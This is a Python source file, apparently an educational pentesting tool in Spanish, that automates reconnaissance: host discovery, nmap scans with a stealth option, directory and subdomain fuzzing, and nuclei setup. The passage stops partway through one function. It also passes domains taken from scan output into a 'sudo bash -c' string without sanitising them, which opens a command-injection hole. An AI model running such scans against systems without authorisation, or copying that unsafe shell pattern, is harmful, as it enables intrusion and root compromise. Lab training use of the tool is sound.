#!/usr/bin/env python3
"""
Educational Pentesting Framework v2.0
Script interactivo para Linux orientado al aprendizaje de ciberseguridad.

Dependencias Python:  pip install -r requirements.txt
Dependencias sistema: sudo ./install.sh

LEGAL DISCLAIMER:
  Esta herramienta esta disenada EXCLUSIVAMENTE para uso educativo en
  laboratorios controlados (CTFs, maquinas virtuales propias, HackTheBox,
  TryHackMe). Usar contra sistemas sin autorizacion explicita es ilegal.
"""

import os
import re
import sys
import shutil
import subprocess
import time
import threading
import itertools
from datetime import datetime
from colorama import init, Fore, Style
import json
import xml.etree.ElementTree as ET

# Lista de herramientas de sistema necesarias para su correcto funcionamiento
REQUIRED_TOOLS = ['ping', 'nmap', 'gobuster', 'nikto', 'searchsploit', 'arp-scan', 'ffuf', 'wpscan', 'hydra', 'sqlmap', 'enum4linux']


# ─────────────────────────────────────────────────────────────
#  UI HELPERS  ─  All terminal rendering helpers live here
# ─────────────────────────────────────────────────────────────

W  = 72  # Global terminal width constant

def _clr():
    """Limpia la pantalla de forma compatible."""
    os.system('clear' if os.name == 'posix' else 'cls')

def _line(char="═", color=Fore.CYAN):
    print(f"{color}{char * W}{Style.RESET_ALL}")

def _box_title(title, color=Fore.CYAN, icon=""):
    """Imprime un título centrado dentro de una caja de dobles líneas."""
    inner = W - 2
    label = f" {title} "
    pad   = inner - len(label)
    left  = pad // 2
    right = pad - left
    print(f"{color}╔{'═' * inner}╗")
    print(f"{color}║{' ' * left}{Style.BRIGHT}{label}{Style.RESET_ALL}{color}{' ' * right}║")
    print(f"{color}╚{'═' * inner}╝{Style.RESET_ALL}")

def _section(title, icon="", color=Fore.BLUE):
    """Separador de sección dentro de un menú."""
    label = f" {title} "
    side  = (W - len(label) - 2) // 2
    rest  = W - side - len(label) - 2
    print(f"\n{color}{'─' * side}[{Style.BRIGHT}{label}{Style.RESET_ALL}{color}]{'─' * rest}{Style.RESET_ALL}")

def _opt(num, desc, status=None, color=Fore.WHITE, icon=""):
    """Imprime una línea de opción formateada con número y estado opcional."""
    num_str  = f"{Fore.CYAN}{Style.BRIGHT} [{num:>2}]{Style.RESET_ALL}"
    desc_str = f"{color}{desc}{Style.RESET_ALL}"
    status_str = f"  {status}" if status else ""
    print(f"{num_str}   {desc_str}{status_str}")

def _prompt(msg="Selección"):
    """Prompt de entrada estilo shell profesional."""
    return input(f"\n  {Fore.GREEN}╰─{Style.BRIGHT}❯{Style.RESET_ALL} {Fore.WHITE}{msg}: {Style.RESET_ALL}").strip()

def _ok(msg):  print(f"  {Fore.GREEN}✔  {msg}{Style.RESET_ALL}")
def _warn(msg): print(f"  {Fore.YELLOW}⚠  {msg}{Style.RESET_ALL}")
def _err(msg):  print(f"  {Fore.RED}✘  {msg}{Style.RESET_ALL}")
def _info(msg): print(f"  {Fore.CYAN}ℹ  {msg}{Style.RESET_ALL}")

def _badge(text, color=Fore.GREEN):
    """Devuelve un badge inline para usar en líneas de opción."""
    return f"{color}[{text}]{Style.RESET_ALL}"


def check_dependencies():
    """Verifica que todas las herramientas necesarias estén instaladas en el sistema."""
    _info("Comprobando dependencias del sistema...")
    missing = []
    for tool in REQUIRED_TOOLS:
        if shutil.which(tool) is None:
            missing.append(tool)
    
    if missing:
        _warn(f"Herramientas faltantes: {', '.join(missing)}")
        _warn("Algunas funciones del script fallarán. Instálalas antes de continuar.")
    else:
        _ok("Todas las dependencias están disponibles.")
    print()


def _spinner_run(label, proc):
    """
    Muestra un spinner animado con tiempo transcurrido mientras 'proc' (Popen) sigue corriendo.
    Bloquea hasta que el proceso termina. Limpia la linea al acabar.
    """
    frames = itertools.cycle(['|', '/', '-', '\\'])
    start  = time.time()
    try:
        while proc.poll() is None:
            elapsed = int(time.time() - start)
            frame   = next(frames)
            sys.stdout.write(
                f"\r  {Fore.YELLOW}[{frame}]{Style.RESET_ALL}  {Fore.WHITE}{label}{Style.RESET_ALL}  "
                f"{Fore.CYAN}({elapsed}s){Style.RESET_ALL}   "
            )
            sys.stdout.flush()
            time.sleep(0.12)
    except KeyboardInterrupt:
        proc.terminate()
    finally:
        # Limpiar la linea del spinner
        sys.stdout.write("\r" + " " * 72 + "\r")
        sys.stdout.flush()


def validate_target(target):
    """
    Valida que el target sea una IP valida o un hostname razonable.
    Devuelve True si es valido, False en caso contrario.
    """
    # IPv4
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', target):
        parts = target.split('.')
        if all(0 <= int(p) <= 255 for p in parts):
            return True
        return False
    # Hostname / dominio (letras, numeros, guiones y puntos)
    if re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-\.]{0,253}[a-zA-Z0-9])?$', target):
        return True
    return False


def print_banner():
    """Imprime el banner principal con efecto typewriter y estilo premium."""
    _clr()
    lines = [
        f"{Fore.GREEN}{Style.BRIGHT}",
        "   ███████╗██████╗ ██╗  ██╗███╗   ███╗███████╗██╗      ██╗   ██╗ ██████╗",
        "   ██╔════╝██╔══██╗██║  ██║████╗ ████║██╔════╝██║      ██║   ██║██╔════╝",
        "   █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║      ██║   ██║██║     ",
        "   ██╔══╝  ██╔══██╗╚════██║██║╚██╔╝██║██╔══╝  ██║      ██║   ██║██║     ",
        "   ██║     ██║  ██║     ██║██║ ╚═╝ ██║███████╗███████╗ ╚██████╔╝╚██████╗",
        "   ╚═╝     ╚═╝  ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝  ╚═════╝  ╚═════╝",
        f"{Style.RESET_ALL}",
    ]
    for line in lines:
        sys.stdout.write(line + "\n")
        sys.stdout.flush()
        time.sleep(0.06)

    _line("═", Fore.GREEN)
    center_text = "  Fr4meLuc  |  Educational Pentesting Framework  v2.0  |  Linux & Ethical Use Only"
    pad = (W - len(center_text)) // 2
    print(f"{Fore.GREEN}{'═' * pad}{Style.BRIGHT}{Fore.YELLOW}{center_text}{Style.RESET_ALL}{Fore.GREEN}{'═' * (W - pad - len(center_text))}")
    _line("═", Fore.GREEN)
    print()


def edu_print(tool, phase, explanation):
    """
    Imprime la capa educativa antes de ejecutar el comando.
    """
    max_inner = W - 4  # max chars inside the box (accounting for 2 border + 2 spaces)
    print(f"{Fore.CYAN}╔{'═' * (W-2)}╗")
    # Título
    label = f"  [?] EDUCATIVO  --  {tool}"[:W-2]
    inner_pad = max(0, W - 2 - len(label))
    print(f"{Fore.CYAN}║{Style.BRIGHT}{Fore.WHITE}{label}{' ' * inner_pad}{Style.RESET_ALL}{Fore.CYAN}║")
    print(f"{Fore.CYAN}╠{'═' * (W-2)}╣")
    # Fase — truncar si es demasiado larga
    phase_row = f"  >> Fase: {phase}"
    if len(phase_row) > W - 2:
        phase_row = phase_row[:W - 5] + "..."
    print(f"{Fore.CYAN}║{Fore.YELLOW}{phase_row}{' ' * max(0, W-2-len(phase_row))}{Fore.CYAN}║")
    # Explicación línea a línea — truncar cada línea al ancho de la caja
    print(f"{Fore.CYAN}╠{'─' * (W-2)}╣")
    for expline in explanation.strip().split("\n"):
        row = f"  {expline}"
        if len(row) > W - 2:
            row = row[:W - 5] + "..."
        overflow = max(0, W - 2 - len(row))
        print(f"{Fore.CYAN}║{Fore.WHITE}{row}{' ' * overflow}{Fore.CYAN}║")
    print(f"{Fore.CYAN}╚{'═' * (W-2)}╝{Style.RESET_ALL}")
    print()


def create_workspace(ip):
    """Crea una estructura de directorios para guardar las evidencias del pentest."""
    # Reemplazamos los puntos de la IP por guiones bajos para que la carpeta sea válida
    base_dir = f"workspace_{ip.replace('.', '_')}"
    dirs = [
        base_dir,
        os.path.join(base_dir, "nmap"),
        os.path.join(base_dir, "web"),
        os.path.join(base_dir, "exploits"),
        os.path.join(base_dir, "os_discovery")
    ]
    
    created_any = False
    try:
        for d in dirs:
            if not os.path.exists(d):
                os.makedirs(d)
                created_any = True
                
        if created_any:
            print(f"{Fore.GREEN}[+] Creado entorno de trabajo estructurado en: ./{base_dir}/")
            print(f"{Fore.GREEN}[+] Todas las evidencias capturadas se guardarán automáticamente en esta carpeta.")
    except PermissionError:
        print(f"\n{Fore.RED}[!] ERROR DE PERMISOS: No se puede crear la carpeta '{base_dir}'.")
        print(f"{Fore.RED}[!] Solución: Intenta ejecutar el script con privilegios adecuados (ej. 'sudo python3 edu_pentest_framework.py')")
        print(f"{Fore.RED}[!] o asegúrate de tener permisos de escritura en tu directorio actual.")
        return None
            
    if created_any:
        print(f"{Fore.GREEN}[+] Creado entorno de trabajo estructurado en: ./{base_dir}/")
        print(f"{Fore.GREEN}[+] Todas las evidencias capturadas se guardarán automáticamente en esta carpeta.")
    
    return base_dir


def run_cmd(cmd_list, capture_output=False, log_file=None, timeout=None):
    """
    Ejecuta un comando en el sistema utilizando el módulo subprocess.
    """
    cmd_str = ' '.join(cmd_list)
    print()
    _line("─", Fore.YELLOW)
    print(f"  {Fore.YELLOW}▶ {Style.BRIGHT}COMANDO:{Style.RESET_ALL}  {Fore.WHITE}{cmd_str}")
    _line("─", Fore.YELLOW)
    print()
    try:
        # Si deseamos capturar el contenido para guardarlo en fichero
        if capture_output or log_file:
            result = subprocess.run(cmd_list, capture_output=True, text=True, timeout=timeout)
            output = result.stdout + (result.stderr if result.stderr else "")
            
            # Imprimir en pantalla para que el usuario pueda interactuar visualmente
            print(output)
            
            # Grabar el volcado en un fichero de texto Markdown / Log
            if log_file:
                with open(log_file, "w", encoding="utf-8") as f:
                    f.write(f"=== Reporte generado por el Framework Educativo de Pentesting ===\n")
                    f.write(f"Comando Ejecutado: {cmd_str}\n")
                    f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"===============================================================\n\n")
                    f.write(output)
                print(f"\n{Fore.GREEN}[+] -> Evidencia guardada exitosamente en: {log_file}")
            
            return output
        else:
            # Ejecución en tiempo real por consola estandar (sin capturar volcado en fichero)
            subprocess.run(cmd_list, timeout=timeout)
            return True
            
    except subprocess.TimeoutExpired:
        _err(f"La herramienta '{cmd_list[0]}' superó el tiempo límite y fue abortada.")
        return None
    except FileNotFoundError:
        _err(f"La herramienta '{cmd_list[0]}' no se encuentra instalada en el sistema.")
        return None
    except Exception as e:
        _err(f"Error inesperado ejecutando '{cmd_list[0]}': {e}")
        return None


def detect_os(ip, workspace_dir):
    """
    Realiza un ping para determinar el SO de la víctima basándose en el campo TTL.
    """
    edu_print(
        tool="ping",
        phase="Identificación de Sistema Operativo (Fingerprinting)",
        explanation="- 'ping -c 1 <ip>': Envía un (1) único paquete ICMP echo request al objetivo.\n"
                    "- Observaremos el valor TTL (Time To Live) contenido en el paquete de respuesta:\n"
                    "  -> Si el TTL ronda el valor 64, suele tratarse de un sistema operativo LINUX/UNIX.\n"
                    "  -> Si el TTL ronda el valor 128, suele tratarse de un sistema operativo WINDOWS."
    )
    
    log_file = os.path.join(workspace_dir, "os_discovery", "ping_ttl.txt")
    output = run_cmd(['ping', '-c', '1', ip], capture_output=True, log_file=log_file)
    
    if output:
        match = re.search(r'ttl=(\d+)', output, re.IGNORECASE)
        if match:
            ttl = int(match.group(1))
            print(f"{Fore.GREEN}[+] Paquete recibido. Se obtuvo un TTL de: {ttl}")
            
            os_guess = ""
            if ttl <= 64:
                os_guess = "LINUX / NIX"
                print(f"{Fore.CYAN}[->] Sistema Operativo Estimado: {os_guess}")
            elif ttl <= 128:
                os_guess = "WINDOWS"
                print(f"{Fore.CYAN}[->] Sistema Operativo Estimado: {os_guess}")
            else:
                os_guess = "DISPOSITIVO DE RED (Cisco, Routers, etc.)"
                print(f"{Fore.CYAN}[->] Sistema Operativo Estimado: {os_guess}")
                
            # Documentar la conclusión dentro del archivo
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"\n[!] Conclusión del Framework: El sistema objetivo parece ser {os_guess} (basado en su TTL de {ttl}).\n")
        else:
            print(f"{Fore.RED}[!] No se detectó un campo TTL válido en la respuesta. (Podrían bloquear protocolo ICMP/Ping)")


def get_network_interfaces():
    """Lee y devuelve una lista de TODAS las interfaces de red presentes en la máquina."""
    interfaces = []
    
    try:
        if sys.platform != 'win32':
            # Leer las interfaces desde el subsistema virtual de Linux
            net_dir = '/sys/class/net/'
            if os.path.exists(net_dir):
                for iface in os.listdir(net_dir):
                    interfaces.append(iface)
    except Exception as e:
        print(f"{Fore.RED}[!] Fallo al obtener interfaces: {e}")
    return interfaces


def do_arp_scan():
    """Realiza un descubrimiento de la red local usando arp-scan sobre la interfaz seleccionada."""
    if shutil.which('arp-scan') is None:
        print(f"{Fore.RED}[!] Herramienta no instalada. (Kali Linux: sudo apt install arp-scan).")
        return

    edu_print(
        tool="arp-scan",
        phase="Reconocimiento Inicial (Descubrimiento de Hosts Locales)",
        explanation="- 'sudo arp-scan -I [interfaz] -l': Emite paquetes ARP broadcast por interfaz.\n"
                    "- Podrás seleccionar visualmente qué tarjeta de red usar para descubrir hosts conectados."
    )
    
    while True:
        interfaces = get_network_interfaces()
        
        if not interfaces:
            print(f"{Fore.YELLOW}[*] No se detectaron interfaces extra, probando modo por defecto...")
            success = run_cmd(['sudo', 'arp-scan', '-l'])
        else:
            print(f"\n{Fore.CYAN}[*] Interfaces de Red Detectadas:{Style.RESET_ALL}")
            for i, iface in enumerate(interfaces, 1):
                print(f"  {Fore.WHITE}{i}) {iface}{Style.RESET_ALL}")
            
            opc_todas = len(interfaces) + 1
            print(f"  {Fore.GREEN}{opc_todas}) Escanear en TODAS simultáneamente{Style.RESET_ALL}")
            print(f"  {Fore.RED}0) Salir / Volver al Menú Principal{Style.RESET_ALL}")
            
            opc = input(f"\n{Fore.CYAN}[?] Elige una opción (0-{opc_todas}): {Style.RESET_ALL}").strip()
            
            if opc == '0':
                return
                
            success = False
            if opc.isdigit() and 1 <= int(opc) <= len(interfaces):
                selected_iface = interfaces[int(opc) - 1]
                print(f"\n{Fore.MAGENTA}=== Escaneando por interfaz: {Style.BRIGHT}{selected_iface}{Style.NORMAL} (Timeout 15s) ==={Style.RESET_ALL}")
                
                if 'docker' in selected_iface.lower():
                    print(f"{Fore.YELLOW}[!] AVISO DOCKER: Si Arp-scan se queda 'congelado', pulsa 'Ctrl+C' para forzar su detención.{Style.RESET_ALL}")
                
                result = run_cmd(['sudo', 'arp-scan', '-I', selected_iface, '-l'], timeout=15)
                if result is not None:
                    success = True
                print("-" * 65)
            elif opc == str(opc_todas):
                for iface in interfaces:
                    print(f"\n{Fore.MAGENTA}=== Escaneando por interfaz: {Style.BRIGHT}{iface}{Style.NORMAL} (Timeout 15s) ==={Style.RESET_ALL}")
                    if 'docker' in iface.lower():
                        print(f"{Fore.YELLOW}[!] AVISO DOCKER: Si Arp-scan se queda 'congelado', pulsa 'Ctrl+C' para forzar su detención.{Style.RESET_ALL}")
                    result = run_cmd(['sudo', 'arp-scan', '-I', iface, '-l'], timeout=15)
                    if result is not None:
                        success = True
                    print("-" * 65)
            else:
                print(f"{Fore.RED}[!] Selección inválida. Por favor, elige un número válido.{Style.RESET_ALL}")
                continue
        
        # Si al menos un escaneo no falló catastróficamente, ofrecemos salto o reescanear (bucle)
        if success:
            print(f"\n{Fore.CYAN}[?] Escaneo de red finalizado.")
            accion = input(f"{Fore.CYAN}[?] Escribe IP para atacar, 'otra' para buscar en otra interfaz, o 'salir': {Style.RESET_ALL}").strip().lower()
            
            if accion == 'salir':
                return
            elif accion == 'otra' or accion == '':
                continue
            else:
                # Asumimos que introdujo una IP
                target_menu(accion)
                return


def add_to_hosts(ip, domain):
    """Pide confirmación para añadir un dominio detectado al /etc/hosts local."""
    print(f"\n{Fore.GREEN}[!] Hemos detectado un dominio asociado a la IP: {Style.BRIGHT}{domain}{Style.RESET_ALL}")
    ans = input(f"{Fore.CYAN}[?] ¿Deseas inyectar '{ip} {domain}' en tu archivo /etc/hosts? (S/n): ").strip().lower()
    
    if ans == '' or ans == 's':
        try:
            # Comando mágico para añadirlo al final de /etc/hosts
            entry = f"{ip} {domain}"
            
            # Revisar si ya existe para no duplicarlo
            with open('/etc/hosts', 'r') as f:
                if entry in f.read():
                    print(f"{Fore.YELLOW}[*] La entrada '{entry}' ya existía en /etc/hosts. Omitiendo.")
                    return True
            
            print(f"{Fore.YELLOW}[>] Ejecutando: sudo bash -c \"echo '{entry}' >> /etc/hosts\"")
            subprocess.run(['sudo', 'bash', '-c', f"echo '{entry}' >> /etc/hosts"], check=True)
            print(f"{Fore.GREEN}[+] ¡El dominio '{domain}' se añadió correctamente a /etc/hosts! Ahora es accesible desde herramientas y navegador.")
            return True
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Falló al modificar /etc/hosts. Quizás cancelaste el 'sudo'.")
        except Exception as e:
            print(f"{Fore.RED}[!] Error modificando /etc/hosts: {e}")
    else:
        print(f"{Fore.YELLOW}[*] Omitiendo grabación de /etc/hosts.")
    return False

def extract_domains_from_nmap(nmap_output):
    """
    Busca heurísticamente en la salida de Nmap (-sC -sV) posibles menciones a dominios.
    Ej: Did not follow redirect to http://maquina.htb/
    Ej: http-title: maquina.htb
    """
    domains = set()
    # Buscar redirecciones http (ej. "Did not follow redirect to http://sec.htb/")
    redirects = re.findall(r'Did not follow redirect to https?://([^/:\s]+)', nmap_output)
    domains.update(redirects)
    
    # Buscar dominios en certificados SSL (ej. "Subject Alternative Name: DNS:maquina.htb")
    ssl_names = re.findall(r'DNS:([^,\s]+)', nmap_output)
    domains.update(ssl_names)
    
    # Filtrar falsos positivos comunes (ej. localhost) o IPs puras
    valid_domains = [d for d in domains if d != 'localhost' and not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', d)]
    
    return valid_domains


def run_nmap(ip, workspace_dir):
    """
    Ejecuta Nmap en Dos Fases (Tipo OSCP):
    1. Escaneo veloz de los 65535 puertos para descubrir cuáles están abiertos.
    2. Escaneo profundo (-sC -sV) únicamente sobre los puertos descubiertos.
    Devuelve un diccionario con el estado web (HTTP/HTTPS) y dominios.
    """
    # ====== Selección de Perfil de Escaneo ======
    _box_title("CONFIGURACION DEL ESCANEO  --  Nmap", Fore.YELLOW)
    _section("Elige tu perfil de descubrimiento de puertos", color=Fore.YELLOW)
    _opt(1, "Rapido y Ruidoso",
         status=f"{Fore.RED}[T4  |  --min-rate 5000  |  Alta deteccion por IDS]{Style.RESET_ALL}")
    _opt(2, "Lento y Silencioso (Stealth)",
         status=f"{Fore.GREEN}[T2  |  Evasion basica de Firewalls/IDS]{Style.RESET_ALL}")
    print()
    _line("─", Fore.YELLOW)
    speed_opc = _prompt("Perfil de escaneo (1/2) [Default: 1]")
    
    if speed_opc == '2':
        nmap_f1_cmd = ['nmap', '-p-', '--open', '-T2', '-n', '-Pn', ip]
        edu_print(
            tool="nmap (Fase 1: Descubrimiento Silencioso)",
            phase="Escaneo Cauteloso de 65535 Puertos",
            explanation="- 'nmap -p- --open -T2 -n -Pn <ip>':\n"
                        "- Busca puertos abiertos lentamente (-T2) limitando la tasa de paquetes.\n"
                        "- Ideal para no saturar la red o intentar evadir reglas simples de IDS/IPS."
        )
        _warn("Iniciando Fase 1 en modo SIGILO. Esto puede tardar varios minutos...")
    else:
        nmap_f1_cmd = ['nmap', '-p-', '--open', '-T4', '--min-rate', '5000', '-n', '-Pn', ip]
        edu_print(
            tool="nmap (Fase 1: Descubrimiento Rápido)",
            phase="Escaneo Agresivo de 65535 Puertos",
            explanation="- 'nmap -p- --open -T4 --min-rate 5000 -n -Pn <ip>':\n"
                        "- Busca a máxima velocidad puertos abiertos en todo el rango (1-65535).\n"
                        "- '--min-rate 5000': Fuerza a enviar 5000 paquetes por segundo (Muy agresivo/Ruidoso)."
        )
        _info("Iniciando Fase 1 en modo RÁPIDO. Esto puede tardar entre 10 y 60 segundos...")
    
    # Excluimos log file en fase 1 porque solo nos importan los números
    output_f1 = run_cmd(nmap_f1_cmd, capture_output=True)
    
    puertos = []
    if output_f1:
        # Extraemos los puertos abiertos de la salida de Nmap (ej: "80/tcp open http")
        puertos = re.findall(r'^(\d+)/tcp\s+open', output_f1, re.MULTILINE)
    
    if not puertos:
        print(f"\n{Fore.RED}[!] FASE 1 COMPLETADA: No se descubrió NINGÚN puerto abierto por TCP.")
        print(f"{Fore.RED}[!] Es posible que el host esté caído, bloqueando Pings o protegido por Firewall. Abortando Nmap.{Style.RESET_ALL}")
        return {'has_web': False, 'web_protocol': 'http://', 'domains': []}
        
    puertos_str = ','.join(puertos)
    print(f"\n{Fore.GREEN}[+] FASE 1 COMPLETADA: Se encontraron los puertos abiertos: {Style.BRIGHT}{puertos_str}{Style.RESET_ALL}\n")

    # ====== FASE 2 ======
    edu_print(
        tool="nmap (Fase 2: Enumeración Profunda)",
        phase="Extracción de Servicios y Vulnerabilidades",
        explanation=f"- 'nmap -p {puertos_str} -sC -sV <ip>':\n"
                    f"- Solo se atacarán los puertos descubiertos para ahorrar horas de tiempo.\n"
                    "- Aplica Scripts Básicos (-sC) y Detecta Versiones Exactas (-sV)."
    )
    
    log_file = os.path.join(workspace_dir, "nmap", "escaneo_principal.txt")
    xml_file = os.path.join(workspace_dir, "nmap", "nmap.xml")
    output_f2 = run_cmd(['nmap', '-oX', xml_file, '-p', puertos_str, '-sC', '-sV', ip], capture_output=True, log_file=log_file)
    
    # Análisis de Resultados Post-Fase 2
    accepted_domains = []
    has_web = False
    web_protocol = 'http://' # Por defecto
    
    if output_f2:
        # 1. Búsqueda de dominios virtuales
        domains = extract_domains_from_nmap(output_f2)
        if domains:
            print(f"\n{Fore.MAGENTA}--- ¡Atención! Nmap detectó nombre(s) de Dominio asociados ---{Style.RESET_ALL}")
            for dom in domains:
                added = add_to_hosts(ip, dom)
                if added:
                    accepted_domains.append(dom)
                    print(f"\n{Fore.GREEN}==================================================================")
                    print(f'{Fore.GREEN}[!] TIP EDUCATIVO: Has descubierto un "Virtual Host" (VHost / Dominio).{Style.RESET_ALL}')
                    print(f"    El dominio activo en el Framework cambiará automáticamente de IP plana '{ip}' a '{dom}'.")
                    print(f"    Esto permite que herramientas como Nikto o Gobuster funcionen sin errores HTTP 404/403.")
                    print(f"    Ahora tienes disponible la opción FFUF en el menú para encontrar Subdominios ocultos.")
                    print(f"{Fore.GREEN}==================================================================\n")
                    
        # 2. Detección Inteligente de HTTP vs HTTPS
        # Comprobar si Nmap detectó algo como "443/tcp open ssl/http" o "https"
        if re.search(r'\d+/tcp\s+open\s+(ssl/http|https)', output_f2, re.IGNORECASE):
            has_web = True
            web_protocol = 'https://'
            print(f"{Fore.GREEN}[+] DETECCIÓN: Se ha encontrado un servidor seguro (HTTPS). Las herramientas web se adaptarán.{Style.RESET_ALL}")
        elif re.search(r'\d+/tcp\s+open\s+http\b', output_f2, re.IGNORECASE):
            has_web = True
            web_protocol = 'http://'
            print(f"{Fore.GREEN}[+] DETECCIÓN: Se ha encontrado un servidor clásico (HTTP).{Style.RESET_ALL}")

    return {
        'has_web': has_web,
        'web_protocol': web_protocol,
        'domains': accepted_domains
    }


def run_web_enum(target, protocol, workspace_dir):
    """Automatiza Gobuster guardando logs dinámicamente sobre HTTP o HTTPS."""
    base_url = f"{protocol}{target}"
    print(f"\n{Fore.GREEN}[*] Inicializando Suite Web contra {base_url}{Style.RESET_ALL}")

    # Gobuster
    print(f"\n{Fore.MAGENTA}--- Continuamos con Módulo Gobuster ---{Style.RESET_ALL}")
    if shutil.which('gobuster'):
        wordlist = input(f"{Fore.CYAN}[?] Especifica ruta al diccionario HTTP (pulsa enter para usar por defecto: "
                         f"/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt): ").strip()
        
        if not wordlist:
            wordlist = "/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"
        
        if not os.path.exists(wordlist):
            print(f"{Fore.RED}[!] No existe la ruta del diccionario especificado: {wordlist}")
        else:
            edu_print(
                tool="gobuster",
                phase="Fuzzing / Bypass (Descubrimiento de rutas secretas HTTP)",
                explanation=f"- Realiza validaciones por fuerza bruta contra el sistema de directorios web.\n"
                            f"- Utiliza un archivo plano de palabras (diccionario) que probara una por una en la URL.\n"
                            f"- '--no-progress': Suprime la barra de progreso; solo mostramos el resumen final."
            )
            log_file = os.path.join(workspace_dir, "web", "gobuster_directorios.txt")
            cmd = ['gobuster', 'dir', '-u', base_url, '-w', wordlist, '--no-progress']
            _line("-", Fore.YELLOW)
            print(f"  {Fore.YELLOW}>> COMANDO:{Style.RESET_ALL}  {Fore.WHITE}{' '.join(cmd)}")
            _line("-", Fore.YELLOW)
            print()

            try:
                with open(log_file, 'w', encoding='utf-8') as lf:
                    proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.DEVNULL)
                _spinner_run("Gobuster escaneando directorios...", proc)
                proc.wait()
            except FileNotFoundError:
                _err("Gobuster no encontrado.")
                return

            # Resumen limpio: parsear el log buscando lineas de resultado
            found = []
            if os.path.exists(log_file):
                with open(log_file, 'r', encoding='utf-8', errors='replace') as lf:
                    for line in lf:
                        # Gobuster imprime: /ruta  (Status: 200) [Size: 1234]
                        m = re.match(r'^(/\S*)\s+\(Status:\s*(\d+)\)\s*\[Size:\s*(\d+)\]', line.strip())
                        if m:
                            found.append({'path': m.group(1), 'status': m.group(2), 'size': m.group(3)})

            if found:
                _ok(f"Gobuster encontro {len(found)} recurso(s):")
                print()
                p_w, s_w, sz_w = 40, 8, 10
                print(f"  {Fore.CYAN}{'RUTA':<{p_w}}  {'STATUS':<{s_w}}  {'BYTES':<{sz_w}}{Style.RESET_ALL}")
                print(f"  {Fore.CYAN}{'-'*p_w}  {'-'*s_w}  {'-'*sz_w}{Style.RESET_ALL}")
                for r in found:
                    sc = Fore.GREEN if r['status'].startswith('2') else (Fore.YELLOW if r['status'].startswith('3') else Fore.RED)
                    print(f"  {Fore.WHITE}{r['path']:<{p_w}}{Style.RESET_ALL}  {sc}{r['status']:<{s_w}}{Style.RESET_ALL}  {Fore.CYAN}{r['size']:<{sz_w}}{Style.RESET_ALL}")
                print()
                _ok(f"Log completo en: {log_file}")
            else:
                _info("Gobuster no encontro rutas accesibles con este diccionario.")
    else:
        _warn("Gobuster no encontrado. Saltando modulo.")


def run_ffuf_subdomains(target, protocol, domain, workspace_dir):
    """Ejecuta FFUF para buscar subdominios, usando el dominio base como inyección de Host header."""
    base_url = f"{protocol}{target}/"

    if not domain:
        print(f"{Fore.RED}[!] ERROR: Necesitas haber descubierto y configurado un Dominio (vía Nmap) para fuzzeo de subdominios.")
        return

    if shutil.which('ffuf') is None:
        print(f"{Fore.RED}[!] La herramienta 'ffuf' no está instalada.")
        return

    print(f"\n{Fore.GREEN}[*] Inicializando Suite FFUF contra {base_url} (Dominio Base: {domain}){Style.RESET_ALL}")
    
    wordlist = input(f"{Fore.CYAN}[?] Especifica ruta al diccionario DNS/Subdominios (pulsa enter para usar por defecto: "
                     f"/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt): ").strip()
    
    if not wordlist:
        wordlist = "/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"
    
    if not os.path.exists(wordlist):
        print(f"{Fore.RED}[!] No existe la ruta del diccionario especificado: {wordlist}")
        print(f"{Fore.YELLOW}[!] En Kali, para tener buenos diccionarios instala 'seclists' (sudo apt install seclists).")
        return

    edu_print(
        tool="ffuf (Fuzz Faster U Fool)",
        phase="Reconocimiento Avanzado (Fuerza Bruta de Subdominios Virtuales)",
        explanation=f"- Envía miles de peticiones HTTP modificando la cabecera 'Host: [palabra_diccionario].{domain}'.\n"
                    f"- Sirve para hallar paneles ocultos en el mismo servidor como ftp.{domain} o admin.{domain}.\n"
                    f"- Usamos el flag '-fc 301,302,400' para ocultar redirecciones o fallos y limpiar la salida."
    )
    
    print(f"\n{Fore.YELLOW}[!] AVISO: FFUF operará en segundo plano silenciosamente. Tardará unos minutos, solo verás coincidencias.{Style.RESET_ALL}")
    
    log_file = os.path.join(workspace_dir, "web", f"ffuf_subdominios_{domain.replace('.', '_')}.txt")
    json_file = os.path.join(workspace_dir, "web", f"ffuf_{domain.replace('.', '_')}.json")
    cmd = ['ffuf', '-s', '-c', '-t', '200', '-w', wordlist,
           '-H', f"Host: FUZZ.{domain}",
           '-u', base_url, '-o', json_file, '-of', 'json']

    _line("-", Fore.YELLOW)
    print(f"  {Fore.YELLOW}>> COMANDO:{Style.RESET_ALL}  {Fore.WHITE}{' '.join(cmd)}")
    _line("-", Fore.YELLOW)
    print()

    try:
        with open(log_file, 'w', encoding='utf-8') as lf:
            proc = subprocess.Popen(cmd, stdout=lf, stderr=subprocess.DEVNULL)
        _spinner_run("FFuF buscando subdominios...", proc)
        proc.wait()
    except FileNotFoundError:
        _err("FFuF no encontrado.")
        return

    _ok(f"FFuF finalizado. Resultados en: {json_file}")


def run_nuclei(target, protocol, workspace_dir):
    """Ejecuta Nuclei para escaneo basado en plantillas de vulnerabilidades actualizadas."""
    base_url = f"{protocol}{target}/"

    if shutil.which('nuclei') is None:
        print(f"{Fore.RED}[!] Nuclei no está instalado en tu sistema.{Style.RESET_ALL}")
        ans = input(f"{Fore.CYAN}[?] ¿Deseas instalar Nuclei ahora automáticamente? (S/n): {Style.RESET_ALL}").strip().lower()
        if ans == '' or ans == 's':
            print(f"{Fore.YELLOW}[>] Ejecutando: sudo apt update && sudo apt install -y nuclei{Style.RESET_ALL}")
            try:
                subprocess.run(['sudo', 'apt', 'update'], check=True)
                subprocess.run(['sudo', 'apt', 'install', '-y', 'nuclei'], check=True)
                print(f"{Fore.GREEN}[+] Nuclei instalado correctamente. Actualizando plantillas (nuclei -ut)...{Style.RESET_ALL}")
                subprocess.run(['nuclei', '-ut'])  # Update templates es una buena práctica
            except subprocess.CalledProcessError:
                print(f"{Fore.RED}[!] Falló la instalación de Nuclei. Por favor configúralo manualmente.{Style.RESET_ALL}")
                return
